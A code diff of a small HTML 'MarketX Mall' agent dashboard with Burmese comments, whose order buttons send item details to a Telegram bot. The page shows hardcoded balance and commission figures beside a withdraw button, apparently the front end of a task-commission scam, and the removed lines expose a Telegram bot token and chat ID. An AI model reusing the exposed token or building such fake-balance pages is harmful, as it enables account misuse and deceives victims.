@@ -3,92 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MarketX - Agent Mall</title>
+    <title>MarketX - Professional Dashboard</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f9; margin: 0; padding-bottom: 80px; }
-        .top-nav { background: #001f3f; color: white; padding: 20px; text-align: center; position: sticky; top: 0; z-index: 100; }
-        .product-container { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 15px; }
-        .card { background: white; border-radius: 15px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #eee; }
-        .product-img { width: 100%; height: 150px; object-fit: cover; background: #eee; }
-        .details { padding: 12px; }
-        .title { font-size: 14px; font-weight: bold; margin: 0; color: #333; }
-        .price { color: #007bff; font-size: 16px; font-weight: bold; margin: 5px 0; }
-        .buy-btn { width: 100%; background: #001f3f; color: white; border: none; padding: 10px; margin-top: 10px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .bottom-menu { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #eee; }
+        :root { --primary: #001f3f; --accent: #007bff; --danger: #ff4757; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding-bottom: 80px; }
+        
+        /* Header & Balance Card */
+        .header { background: var(--primary); color: white; padding: 30px 20px; border-radius: 0 0 25px 25px; text-align: center; }
+        .stats-container { display: flex; justify-content: space-around; margin-top: -25px; padding: 0 15px; }
+        .stat-box { background: white; padding: 15px; border-radius: 15px; width: 42%; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; }
+        .stat-box small { color: #888; font-size: 12px; }
+        .stat-box div { font-size: 18px; font-weight: bold; color: var(--primary); }
+
+        /* Mall Section */
+        .section-title { padding: 20px 20px 10px; font-size: 18px; font-weight: bold; color: var(--primary); }
+        .product-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 0 15px; }
+        .card { background: white; border-radius: 15px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .product-img { width: 100%; height: 140px; object-fit: cover; }
+        .details { padding: 10px; }
+        .buy-btn { width: 100%; background: var(--primary); color: white; border: none; padding: 10px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 8px; }
+
+        /* Bottom Menu */
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; }
+        .nav-item { text-decoration: none; color: #7f8c8d; font-size: 12px; text-align: center; }
+        .nav-item.active { color: var(--accent); }
     </style>
 </head>
 <body>
 
-    <div class="top-nav">
-        <div style="padding: 10px; text-align: right;">
-    <a href="withdraw.html" style="background: #ff4757; color: white; padding: 8px 15px; border-radius: 5px; text-decoration: none; font-size: 13px; font-weight: bold;">💰 Withdraw</a>
-</div>
-        <h3 style="margin:0;">MarketX Mall</h3>
+    <div class="header">
+        <h2 style="margin:0;">MarketX Mall</h2>
+        <p style="opacity:0.8; font-size: 14px;">Welcome Back, Agent</p>
     </div>
 
-    <div class="product-container">
+    <div class="stats-container">
+        <div class="stat-box">
+            <small>Total Balance</small>
+            <div>$1,250.00</div>
+        </div>
+        <div class="stat-box">
+            <small>My Commission</small>
+            <div style="color: #2ecc71;">$145.00</div>
+        </div>
+    </div>
+
+    <div style="text-align: right; padding: 15px 20px 0;">
+        <a href="withdraw.html" style="background: var(--danger); color: white; padding: 8px 15px; border-radius: 20px; text-decoration: none; font-size: 12px; font-weight: bold;">💰 Get Paid</a>
+    </div>
+
+    <div class="section-title">Available Products</div>
+
+    <div class="product-grid">
         <div class="card">
             <img src="https://images.unsplash.com/photo-1696446701796-da61225697cc?q=80&w=500" class="product-img">
             <div class="details">
-                <p class="title">iPhone 15 Pro</p>
-                <p class="price">$999.00</p>
-                <button class="buy-btn" onclick="sendOrder('iPhone 15 Pro', '$999.00')">Order Now</button>
+                <div style="font-size:14px; font-weight:bold;">iPhone 15 Pro</div>
+                <div style="color:var(--accent); font-weight:bold;">$999</div>
+                <button class="buy-btn" onclick="sendOrder('iPhone 15 Pro', '$999')">Order Now</button>
             </div>
         </div>
 
         <div class="card">
             <img src="https://images.unsplash.com/photo-1544117518-30dd0f787a3b?q=80&w=500" class="product-img">
             <div class="details">
-                <p class="title">Smart Watch Ultra</p>
-                <p class="price">$250.00</p>
-                <button class="buy-btn" onclick="sendOrder('Smart Watch Ultra', '$250.00')">Order Now</button>
+                <div style="font-size:14px; font-weight:bold;">Watch Ultra</div>
+                <div style="color:var(--accent); font-weight:bold;">$250</div>
+                <button class="buy-btn" onclick="sendOrder('Watch Ultra', '$250')">Order Now</button>
             </div>
         </div>
     </div>
 
-    <div class="bottom-menu">
-        <a href="#" style="text-decoration:none;">🏠 Home</a>
-        <a href="index.html" style="text-decoration:none;">🚪 Logout</a>
-    </div>
+    <nav class="nav-bar">
+        <a href="#" class="nav-item active">🏠<br>Home</a>
+        <a href="withdraw.html" class="nav-item">💰<br>Withdraw</a>
+        <a href="index.html" class="nav-item">🚪<br>Logout</a>
+    </nav>
 
     <script>
-        function sendOrder(itemName, itemPrice) {
-            // --- ပြင်ဆင်ရန်နေရာ ---
-            const botToken = "8444757495:AAG6kOwh8r_hHFyyRWcXctnK0Ym1Z7pKbzU"; 
-            const chatId = "6698333806";
-            // ---------------------
+        function sendOrder(name, price) {
+            // သင့်ရဲ့ Token နဲ့ ID ကို အောက်မှာ ပြန်ထည့်ပါ
+            const token = "ဒီမှာ_သင့်ရဲ့_Bot_Token_ထည့်ပါ";
+            const chat_id = "ဒီမှာ_သင့်ရဲ့_Chat_ID_ထည့်ပါ";
+            
+            const message = `🎯 Order Received!\nItem: ${name}\nPrice: ${price}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
 
-            const message = "🛒 Order New!\nItem: " + itemName + "\nPrice: " + itemPrice;
-            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
-
-            alert("Sending order for " + itemName + "...");
-
-            fetch(url)
-            .then(function(response) {
-                if(response.ok) {
-                    alert("Telegram ဆီသို့ Order ပို့ပြီးပါပြီ!");
-                } else {
-                    alert("Error: Token သို့မဟုတ် Chat ID မှားနေနိုင်ပါသည်။");
-                }
-            })
-            .catch(function(error) {
-                alert("Network Error ဖြစ်နေပါသည်။ အင်တာနက်စစ်ပေးပါ။");
+            fetch(url).then(res => {
+                if(res.ok) alert("Order sent to admin!");
             });
         }
     </script>
-<script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/65c36e3e8d261e0359ab656e/default';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-    })();
-    </script>
-    ```
-</body>
+
+    </body>
 </html>
-
-
